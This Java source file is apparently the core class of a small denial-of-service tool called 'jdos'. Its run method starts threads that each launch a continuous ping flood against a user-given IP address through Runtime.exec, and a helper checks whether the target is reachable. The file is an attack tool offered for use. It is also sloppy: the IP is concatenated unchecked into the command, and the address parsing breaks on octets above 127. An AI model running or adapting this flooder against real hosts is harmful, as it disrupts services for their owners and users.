package jdos.main;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;

/**
 * Created by ExploiTR on 14-Jun-17.
 * <p>
 * Contains Main Attack Method
 */
public class Attack implements Runnable {

    private final String IPAddress;
    private final static int timeOut = 250;
    private final long byteSize = 64;

    public Attack(String IP) {
        this.IPAddress = IP;
    }

    @Override
    public void run() {
        new Thread(() -> {
            try {
                Controller.processArrayList.add(Runtime.getRuntime().exec("ping " + IPAddress + " -t -l " + byteSize));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }


    public boolean validIP() {
        String[] v4 = IPAddress.split("\\.");
        return v4.length == 4 || v4.length == 2 || v4.length == 3;
    }

    public void checkIP(Runner runner) {
        new Thread(() -> {
            if (!validIP()) {
                runner.onDone(false);
                return;
            }
            try {
                if (IPAddress.split("\\.").length > 3) {
                    String[] adder_spt = IPAddress.split("\\.");
                    runner.onDone(InetAddress.getByAddress(new byte[]{
                            Byte.parseByte(adder_spt[0]),
                            Byte.parseByte(adder_spt[1]),
                            Byte.parseByte(adder_spt[2]),
                            Byte.parseByte(adder_spt[3])
                    }).isReachable(timeOut));
                } else {
                    runner.onDone(InetAddress.getByName(IPAddress).isReachable(timeOut));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public interface Runner {
        void onDone(boolean what);
    }
}
